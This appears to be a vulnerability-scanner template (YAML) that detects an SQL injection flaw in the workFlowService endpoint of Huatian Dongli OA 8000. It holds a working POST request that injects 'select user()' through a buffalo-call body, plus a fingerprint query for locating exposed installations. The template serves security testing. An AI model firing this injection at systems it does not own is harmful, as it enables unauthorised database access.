expression: r0()
id: oa8000-workflowservice-sql-inject
info:
  author: zan8in
  description: "\u534E\u5929\u52A8\u529BOA 8000\u7248 workFlowService\u63A5\u53E3\u5B58\
    \u5728SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\
    \u53EF\u83B7\u53D6\u6570\u636E\u5E93\u654F\u611F\u4FE1\u606F\napp=\"\u534E\u5929\
    \u52A8\u529B-OA8000\"\n"
  name: "\u534E\u5929\u52A8\u529BOA 8000\u7248 workFlowService SQL\u6CE8\u5165\u6F0F\
    \u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/oa/%E5%8D%8E%E5%A4%A9OA/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9BOA%208000%E7%89%88%20workFlowService%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'<buffalo-reply>')
      && response.body.bcontains(b'user()')
    request:
      body: "<buffalo-call> \n<method>getDataListForTree</method> \n<string>select\
        \ user()</string> \n</buffalo-call>\n"
      method: POST
      path: /OAapp/bfapp/buffalo/workFlowService
